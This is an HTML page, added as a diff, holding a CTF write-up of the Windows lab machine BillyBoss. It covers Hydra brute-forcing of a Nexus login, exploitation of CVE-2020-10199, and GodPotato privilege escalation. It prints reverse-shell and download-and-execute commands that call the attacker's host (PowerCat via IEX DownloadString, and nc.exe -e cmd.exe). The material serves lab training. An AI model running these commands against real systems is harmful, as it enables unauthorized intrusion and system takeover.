@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BillyBoss &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>BillyBoss</h1>
+    <div class="meta">Target: <code>192.168.176.61</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">Nexus</span><span class="tag">CeWL</span><span class="tag">Hydra</span><span class="tag">RCE</span><span class="tag">SeImpersonate</span><span class="tag">GodPotato</span><span class="tag">CVE-2020-10199</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl3" href="#nexus-login-analysis">Nexus Login Analysis</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#cewl-wordlist-hydra">CeWL Wordlist + Hydra</a><a class="lvl3" href="#cve-2020-10199-nexus-3-21-0-authenticated-rce">CVE-2020-10199, Nexus 3.21.0 Authenticated RCE</a><a class="lvl3" href="#shell-upgrade-with-powercat">Shell Upgrade with PowerCat</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#seimpersonate-via-godpotato">SeImpersonate via GodPotato</a><a class="lvl2" href="#root-system">Root / SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>BillyBoss is a Windows machine hosting a Sonatype Nexus Repository Manager. The foothold requires generating a site-specific wordlist with CeWL to crack the base64-encoded login form, then exploiting CVE-2020-10199, an authenticated RCE in Nexus 3.21.0. Privilege escalation uses GodPotato against SeImpersonatePrivilege on Windows 10 1903.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: BaGet
+8081/tcp open  http          Jetty 9.4.18.v20190429
+|_http-server-header: Nexus/3.21.0-05 (OSS)
+| http-robots.txt: 2 disallowed entries
+|_/repository/ /service/
+|_http-title: Nexus Repository Manager
+</code></pre>
+<p>Port 8081 is the target. The server banner exposes the exact version: <strong>Nexus 3.21.0-05</strong>.</p>
+<h3 id="nexus-login-analysis">Nexus Login Analysis</h3>
+<p>Nexus 3.21.0-05 has a known authenticated RCE (EDB-49385 / CVE-2020-10199), but the exploit needs credentials. The default <code>admin:admin123</code> fails. Looking at the login POST request in Burp reveals the credentials are base64-encoded before transmission:</p>
+<pre><code>username=‹redacted›&amp;password=‹redacted›
+</code></pre>
+<p>Standard wordlists produce no results because Hydra needs to encode values on the fly.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="cewl-wordlist-hydra">CeWL Wordlist + Hydra</h3>
+<p>When generic wordlists fail, scraping the target application's own text often produces passwords matching the site's naming conventions. CeWL spiders the Nexus interface and extracts unique words:</p>
+<pre><code class="language-sh">cewl http://192.168.176.61:8081/ | grep -v CeWL &gt; custom-wordlist.txt
+cewl --lowercase http://192.168.176.61:8081/ | grep -v CeWL &gt;&gt; custom-wordlist.txt
+</code></pre>
+<p>Hydra's <code>^USER64^</code> and <code>^PASS64^</code> placeholders instruct it to base64-encode credentials before injecting them, matching what the login form expects:</p>
+<pre><code class="language-sh">hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt \
+  'http-post-form://192.168.176.61:8081/service/rapture/session:username=^USER64^&amp;password=^PASS64^:C=/:F=403'
+[8081][http-post-form] host: 192.168.176.61   login: ‹redacted›   password: ‹redacted›
+</code></pre>
+<p>Credentials:</p>
+<pre><code>‹redacted› : ‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>Why CeWL works:</strong> applications built around a specific topic tend to use terminology from that domain in passwords, product names, feature names, version strings. CeWL harvests those terms directly from the site, producing a compact list heavily biased toward what this particular service's admin might have chosen.</p>
+</blockquote>
+<h3 id="cve-2020-10199-nexus-3-21-0-authenticated-rce">CVE-2020-10199, Nexus 3.21.0 Authenticated RCE</h3>
+<p>EDB-49385 exploits a server-side request evaluation flaw in Nexus's EL (Expression Language) handler. I downloaded the exploit, updated the target IP, username, and password, and replaced its default payload with a base64-encoded PowerShell reverse shell:</p>
+<pre><code class="language-sh">python3 ‹redacted›.py
+</code></pre>
+<p>Shell received as <code>billyboss\nathan</code>:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+connect to [...] from (UNKNOWN) [192.168.176.61] 50215
+whoami
+billyboss\nathan
+PS C:\Users\nathan\Nexus\‹redacted›-3.21.0-05&gt;
+</code></pre>
+<p>Local flag:</p>
+<pre><code class="language-powershell">PS C:\Users\nathan\Desktop&gt; type local.txt
+‹redacted›
+</code></pre>
+<h3 id="shell-upgrade-with-powercat">Shell Upgrade with PowerCat</h3>
+<p>The initial shell was unstable with WinPEAS, so a PowerCat upgrade provided a cleaner session:</p>
+<pre><code class="language-powershell">IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.244/powercat.ps1');powercat -c 192.168.45.244 -p 53 -e cmd
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="seimpersonate-via-godpotato">SeImpersonate via GodPotato</h3>
+<p>WinPEAS confirms SeImpersonatePrivilege is enabled. <code>systeminfo</code> shows Windows 10 Pro, build 18362 (version 1903):</p>
+<pre><code class="language-sh">OS Name:    Microsoft Windows 10 Pro
+OS Version: 10.0.18362 N/A Build 18362
+</code></pre>
+<p>Windows 10 1903 is recent enough that GodPotato applies. The precompiled NET4 build from the official repo is the version that worked, earlier compiled versions failed silently:</p>
+<pre><code class="language-powershell">.\potato.exe -cmd &quot;C:\Users\nathan\Desktop\nc.exe 192.168.45.244 8081 -e cmd.exe&quot;
+</code></pre>
+<blockquote>
+<p><strong>GodPotato vs older potatoes:</strong> GodPotato (2023) works on Windows Server 2012–2022 and Windows 10/11 by abusing the RPC Endpoint Mapper rather than the Print Spooler or BITS triggers used by older potato variants. It's more reliable on modern builds where those older trigger paths are patched. Matching the .NET framework version on the target to the compiled binary matters, the NET4 version must match a target running .NET 4.x.</p>
+</blockquote>
+<h2 id="root-system">Root / SYSTEM</h2>
+<pre><code class="language-sh">rlwrap nc -lvnp 8081
+connect to [...] from (UNKNOWN) [192.168.176.61] 50245
+Microsoft Windows [Version 10.0.18362.719]
+
+C:\Windows\system32&gt; whoami
+(no output — known GodPotato quirk on some builds)
+</code></pre>
+<p>The shell runs as SYSTEM despite <code>whoami</code> returning blank:</p>
+<pre><code class="language-powershell">C:\Users\Administrator\Desktop&gt; type proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Version banners are gifts.</strong> The Nexus server header gave the exact version string that maps to a searchsploit hit, always note service banners during recon.</li>
+<li><strong>CeWL fills the gap when generic wordlists fail.</strong> Site-scraped wordlists are small, targeted, and often hit passwords that rockyou never would.</li>
+<li><strong>Know your .NET version before running potato exploits.</strong> GodPotato NET4 on a NET4 target, NET35 on older ones. Wrong version = silent failure.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
